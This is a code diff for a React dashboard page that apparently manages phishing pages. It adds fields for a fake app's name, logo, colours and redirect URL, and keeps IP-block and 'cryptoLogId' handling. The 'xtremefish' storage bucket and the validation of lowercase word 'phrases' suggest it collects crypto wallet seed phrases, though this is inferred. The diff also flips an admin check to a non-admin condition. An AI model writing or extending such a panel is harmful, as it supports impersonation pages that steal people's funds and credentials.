@@ -13,20 +13,22 @@ import {
 } from "@/shared/Api/dashboard";
 import { getIps } from "@/shared/Api/dashboard";
 import Popup from "@/components/Popup";
-import SubscriptionPage from "@/appPages/SubscriptionPage";
 
 function page() {
   const allPhrases = useSelector((state: any) => state?.dash?.phrases);
-  console.log("all Phrases:   ", allPhrases);
   const [currentPage, setCurrentPage] = useState(1);
   const [itemsPerPage] = useState(10);
   const [isPopupOpen, setIsPopupOpen] = useState(false);
   const [modalVisible, setModalVisible] = useState(false);
   const [inputText, setInputText] = useState("");
   const [error, setError] = useState("");
+  const [redirectLink, setRedirectLink] = useState("");
+  const [appName, setAppName] = useState("");
+  const [image, setImage] = useState("https://firebasestorage.googleapis.com/v0/b/xtremefish-9ceaf.appspot.com/o/images%2Favatar.png?alt=media&token=6b910478-6e58-4c73-8ea9-f4827f2eaa1b");
   const [ipBlock, setIpBlock] = useState(false);
   const user = useSelector((state: any) => state.auth.user);
   const [descVal, setDescVal] = useState("");
+  const [originalDesc, setOriginalDesc] = useState("");
   const [updateId, setUpdate] = useState("");
   const [urls, setUrls] = useState<any>();
   const Urls = useSelector((state: any) => state.dash.urls);
@@ -34,6 +36,9 @@ function page() {
   const userSubscription = useSelector(
     (state: any) => state.dash.subscriptionLogs
   );
+  const [selectedModColor, setSelectedModColor] = useState("");
+  const [selectedBtnColor, setSelectedBtnColor] = useState("");
+  const [selectedColor, setSelectedColor] = useState("");
   const dispatch = useDispatch();
   const [phrases, setPhrases] = useState<any[]>([]);
 
@@ -49,14 +54,13 @@ function page() {
   // ];
 
   useEffect(() => {
-    // Function to fetch data
     const loadPhrases = async () => {
       const fetchedPhrases = await fetchPhrases();
       console.log("Phrases:   ", fetchedPhrases);
-      setPhrases(fetchedPhrases); // Update state with fetched phrases
+      setPhrases(fetchedPhrases);
     };
 
-    loadPhrases(); // Call the function
+    loadPhrases();
   }, [allPhrases?.length]);
 
   const handleModalToggle = () => {
@@ -68,7 +72,18 @@ function page() {
   };
 
   const handleUpdate = (post: any) => {
-    setDescVal(post?.description);
+    const fullUrl = post?.description || "";
+    const baseUrl = fullUrl.split(/[?#]/)[0];
+  
+    setSelectedColor(post?.backgroundcolor);
+    setSelectedBtnColor(post?.btnColor);
+    setSelectedModColor(post?.modalColor);
+    setRedirectLink(post?.redirectUrl);
+    setAppName(post?.appName);
+    setImage(post?.appLogo);
+  
+    setOriginalDesc(fullUrl);
+    setDescVal(baseUrl);
     setUpdate(post?._id);
     setIpBlock(false);
     handleOpenPopup();
@@ -92,11 +107,8 @@ function page() {
       setError("Please enter a phrase.");
       return;
     }
-
-    // Regex to check if the input contains only lowercase letters and spaces
     const regex = /^[a-z\s]+$/;
 
-    // Check if the inputText contains only valid characters (lowercase letters and spaces)
     if (!regex.test(inputText)) {
       setError("Only lowercase letters and spaces are allowed.");
       return;
@@ -132,10 +144,8 @@ function page() {
   };
 
   const goToRunEscape = (url: any) => {
-    // Check if the URL is valid and if it ends with a valid format for appending the ID
 
     if (isValidUrl(url)) {
-      console.log("valid url");
       const separator = url.description.includes("?") ? "&" : "?";
       window.open(
         `${url.description}${separator}userId=${user?._id}&cryptoLogId=${url.cryptoLogId}`,
@@ -253,6 +263,19 @@ function page() {
                       setUpdate={setUpdate}
                       ipBlock={ipBlock}
                       setIpBlock={setIpBlock}
+                      appLogo={image}
+                      setImage={setImage}
+                      appName={appName}
+                      setAppName={setAppName}
+                      redirectLink={redirectLink}
+                      setRedirectLink={setRedirectLink}
+                      selectedBtnColor={selectedBtnColor}
+                      selectedModColor={selectedModColor}
+                      selectedColor={selectedColor}
+                      setSelectedBtnColor={setSelectedBtnColor}
+                      setSelectedColor={setSelectedColor}
+                      setSelectedModColor={setSelectedModColor}
+                      originalDesc={originalDesc}
                     />
                     {modalVisible && (
                       <div className="fixed inset-0 backdrop-blur-sm flex justify-center items-center z-50 animate-fadeIn">
@@ -392,7 +415,9 @@ function page() {
                                 }`}
                                 target="_blank"
                               >
-                                {url.description}
+                                {
+                                  url?.description?.split("?")[0]
+                                }
                               </a>
                             </td>
                             <td>
@@ -404,7 +429,7 @@ function page() {
                             </td>
                             <td>{url?.redirectUrl}</td>
                             <td>
-                              {user?.admin ? (
+                              {user?.role!=='admin' ? (
                                 <Tooltip title="click">
                                   <Button
                                     onClick={() => {
